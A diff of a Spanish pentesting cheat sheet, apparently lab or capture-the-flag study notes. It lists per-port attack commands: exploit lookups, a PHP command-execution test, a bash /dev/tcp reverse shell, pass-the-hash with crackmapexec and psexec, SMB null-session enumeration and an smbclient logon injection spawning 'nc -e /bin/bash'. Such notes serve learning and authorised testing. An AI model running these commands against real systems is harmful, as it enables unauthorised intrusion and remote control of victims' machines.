@@ -46,9 +46,7 @@ searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
           ftp <ip-address> -> test:) 
 	  		   -> pass
 ```
-
-
-
+<br><br>
 ## 22 SSH (Secure Shell)
 Protocolo usado para conectarse de forma remota a un servidor de forma segura.
 
@@ -59,17 +57,19 @@ Solo se ejecuta el exploit con python y se le indica la ip-address víctima.
 searchsploit username enumeration -> OpenSSH 2.3 < 7.7 - Username Enumeration ----- linux/remote/45233.py
 python2 45233.py <ip-address>
 ```
-
-
-
+<br><br>
+## 25 SMTP (Simple Mail Transfer Protocol).
+Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
+Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
+SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.
+<br><br>
 ## 80 HTTP (Hypertext Transfer Protocol)
 Protocolo usado para montar sitios web.
 Con la herramienta whatweb puedes ver informacion acerca del sitio web como que tipo de CMS "Control Management System" se esta usando ya sea joomla, wordpress o drupal, con que tipo de lenguaje esta programado (php, python, java etc). Tambien puedes ver esta información con wappalyzer que es un plugin que puedes instalar en tu navegador.
 ```
 whatweb http://<ip-addres>
 ```
-
-
+<br>
 Si hay un escaner de url en el sitio web, crea un archivo y ve si el contenido del archivo te lo muestra en la página al subirlo, prueba si te interpreta codigo php injectando un comando.
 ```
 nvim test -> <?php system("whoami"); ?>
@@ -82,14 +82,12 @@ Intentar escanear la url de la maquina junto con los puertos que tiene abiertos 
 http://127.0.0.1:443
 http://localhost:5000
 ```  
-
-
+<br>
 Si hay un campo para subir archivos probar subiendo un archivo.txt para verificar si se esta aplicando sanitización, en caso de que no se esta validando el tipo de archivo que se sube puedes subir un archivo.php malicioso para enviarte una reverse shell.
 ```
 nvim reverse_shell.php -> bash -c 'bash -i >& /dev/tcp/<ip-address>/443 0>&1'
 ```
-
-
+<br>
 Si se aplica validación en archivos.xml se puede acontacer un XXE si el contenido del archivo.xml te lo muestra en la web tal cual. 
 
 Puedes leer el /etc/passwd para ver los usarios que hay en el sistema.
@@ -153,86 +151,91 @@ Sincronizar tu hora a la de la maquina víctima de forma temporal para obtener u
 
 
 ## 135 MSRPC
-
-
-
+<br><br>
 ## 443 HTTPS (Hypertext Transfer Protocol Secure)
 Inspeccionar el certificado en busca de información relevante, como si se esta aplicando virtual hosting "Common Name" o para ver que emails estan registrados.
 ```
 openssl s_client -connect <ip-address>:443
 ```
-
-
-
+<br><br>
 ## 139/445 SMB (Server Message Block)
-Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.
-
+Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.<br>
 Con este comando puedes ver el nombre de la maquina víctima (Si es controlador del dominio "DC-Admin"), la versión de windows que se esta utilizando y si el SMB esta firmado.
 ```
 crackmapexec smb <ip-address>
 ```
-
-
+<br>
 Una vez obtenido un usario y contraseña puedes ver si son válidos a nivel de sistema si te pone un [+] en el output.
 ```
 crackmapexec smb <ip-address> -u 'user' -p 'password'
 ```
-          
-
+<br>
 Listar los recursos compartidos que existen a nivel de red empleando un null session sino no se cuenta con credenciales válidas.
 ```
 crackmapexec smb <ip-address> -u 'null' -p ' ' --shares
 ```
- 
-
+<br>
 Hacer PassTheHash para comprobar que le hash que se tiene es del usario administrator y asi poder ganar acceso al
 sistema sin proporcionar la contraseña con la herramienta psexec.py
 ```
 crackmapexec smb <ip-address> -u 'Administrator' -H ':<hash>'
 ```
-
-
+<br>
 Si ya tienes el hash NTLM ejecuta el siguiente comando y obtendras una consola como el usario nt/authority/system.
 ```
 psexec.py WORKGROUP/Administrator@<ip-address> -hashes :<HashNTLM>
 ```
-
-
+<br>
 Listar los recursos compartidos que hay a nivel de red.
 ```
 smbmap -H <ip-address>
-smbmap -H <ip-address> -u 'null'
+# -H -> Especificar la dirección IP.
 ```
-
-
+<br>
+Listar los recursos compartidos haciendo uso de un null session.
+```
+smbmap -H <ip-address> -u 'null'
+# -u -> Indicar un usuario.
+```
+<br>
+Listar los recursos compartidos teniendo un usuario y una contraseña validos.
+```
+smbmap -H <ip-address> -u <username> -p <password>
+```
+<br>
+Especificar el nombre del recurso del servidor al cual se desea conectar.
+```
+smbmap -H <ip-address> -r <resourcename>
+# -r -> Especificar la ruta del recurso al que se quiere conectar.
+```
+<br>
+Descargar un recurso compartido a la ruta actual.
+```
+smbmap -H <ip-address> --download <resourcename>/<filename>
+```
+<br>
 Listar recursos de la maquina.
 ```
 smbclient -L <ip-address> -N 
 ```  
-
-
 En caso de que se presente el error: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED al querer listar los recursos de la maquina ejecuta el siguiente comando para solucionarlo.
 ```
 smbclient -L ipaddress -N --option 'client min protocol = NT1'
 ```
-
-
+<br>
 Conectarse a un recurso de la maquina víctima.
 ```
 smbclient //<ip-address>/name_resource -N --option 'client min protocol = NT1'
 Ej; smbclient //<ip-address>/tmp -N --option 'client min protocol = NT1'
 ```
-
-
+<br>
 Una vez conectado a un recurso de la maquina ver si esta habilitado el comando logon con help. Si está habilitado te puedes enviar una reverse shell poniendote en escucha con ncat por el puerto 443.
 ```
 sudo rlwrap ncat -nlvp 443
 
 logon "/='nohup nc -e /bin/bash <ip-address> 443'"
 ```
-
-
-
+<br><br>
 ## 5985 WinRM (Windows Remote Management)
 La administracion remota de windows permite que los sistemas accedan o intercambien información de gestión a través de una red común.
 
